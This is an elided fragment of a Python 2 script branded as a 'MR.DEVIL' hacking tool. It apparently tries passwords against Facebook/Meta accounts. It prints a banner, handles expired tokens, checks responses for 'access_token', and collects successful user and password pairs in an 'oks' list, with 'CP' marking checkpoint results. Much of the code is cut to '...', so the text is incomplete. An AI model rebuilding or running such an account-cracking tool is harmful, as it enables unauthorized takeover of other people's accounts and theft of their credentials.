#!/usr/bin/python2
#coding=utf-8
#mrdevilbrand official Hacking tool maker 
...
\033[0;95m═══════════════════════════════════════════
\033[0;91m     \033[0;91mOWNER   :\033[0;92mMR.DEVIL               
\033[0;91m     \033[0;91mTOOL nm :\033[0;92mMETA version 0.2     
\033[0;91m 《\033[0;92mMR.DEVIL,\033[0;92mPROGRAMMER & DARK HACKER《
\033[0;95m═══════════════════════════════════════════
"""
...
def tokenz():
	...
	try:
		...
		print "\033[1;91m[!] token expired "
		e = raw_input("\033[1;91m[*] \033ppress y for  login menu or n for Exit?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mMRD_OK100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mMRD_CP'
